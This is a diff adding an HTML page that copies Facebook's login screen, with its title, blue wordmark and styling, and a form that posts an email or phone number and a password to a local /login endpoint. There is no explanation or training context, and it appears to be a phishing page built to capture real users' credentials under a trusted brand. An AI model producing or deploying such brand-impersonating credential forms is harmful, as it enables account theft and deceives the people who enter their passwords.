@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+            width: 360px;
+            text-align: center;
+        }
+        .login-container h1 {
+            color: #1877f2;
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            padding: 12px;
+            font-size: 18px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>facebook</h1>
+        <form action="/login" method="POST">
+            <input type="text" name="email" placeholder="Email or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <div>
+                <a href="#">Forgotten password?</a>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
